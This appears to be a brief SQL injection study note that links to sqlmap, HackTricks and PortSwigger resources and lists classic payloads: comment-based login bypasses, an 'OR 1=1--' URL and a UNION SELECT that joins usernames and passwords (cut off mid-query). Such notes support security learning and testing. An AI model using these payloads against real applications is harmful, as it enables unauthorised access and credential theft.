# SQL Injection


Even if it appears to be harmless, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.


## Resources
https://github.com/sqlmapproject/sqlmap/wiki/
https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

https://book.hacktricks.xyz/pentesting-web/sql-injection
https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main

https://portswigger.net/web-security/sql-injection/cheat-sheet

https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main


## Payloads

`admin'#` close the query with that single quote, allowing the script to search for the 
admin username. By adding the hashtag, we will comment out the rest: `SELECT * FROM users WHERE username='admin'#' AND password='abc123'`


`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`



### Concatenate in only one column
`1 UNION SELECT username || '~' || password FROM `

